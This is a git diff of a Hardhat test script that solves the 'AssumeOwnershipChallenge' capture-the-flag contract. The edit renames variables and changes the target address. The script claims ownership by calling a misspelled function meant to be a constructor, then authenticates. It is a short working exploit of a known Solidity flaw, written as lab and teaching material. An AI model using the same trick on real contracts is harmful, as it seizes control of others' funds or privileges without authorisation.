@@ -2,13 +2,12 @@ import crypto, { sign } from "crypto";
 import { ethers } from "hardhat";
 import { BigNumber, Contract, Signer } from "ethers";
 import { expect } from "chai";
-import { formatEtherscanTx } from "../utils/format";
+// import { formatEtherscanTx } from "../utils/format";
 import { HDNode } from "ethers/lib/utils";
 
 let accounts: Signer[];
 let eoa: Signer;
-let attacker: Contract;
-let contract: Contract; // challenge contract
+let challengeContract: Contract;
 let tx: any;
 
 before(async () => {
@@ -17,19 +16,19 @@ before(async () => {
   const challengeFactory = await ethers.getContractFactory(
     "AssumeOwnershipChallenge"
   );
-  contract = challengeFactory.attach(
-    `0x5845030FAA1E04D794FE219a1A956b05b86Fcc3d`
+  challengeContract = challengeFactory.attach(
+    `0x139D666C0ffE1F9ba6f557D57E35ddB198D6ef88`
   );
 });
 
 it("solves the challenge", async function () {
-  // the supposed-to-be constructor is misspelled (owMer) and can be called
-
-  tx = await contract.AssumeOwmershipChallenge()
+  // the function looks like a constructor but it is misspelled
+  // so we can call it directly
+  tx = await challengeContract.AssumeOwmershipChallenge()
   await tx.wait()
-  tx = await contract.authenticate();
+  tx = await challengeContract.authenticate();
   await tx.wait();
 
-  const isComplete = await contract.isComplete();
+  const isComplete = await challengeContract.isComplete();
   expect(isComplete).to.be.true;
 });
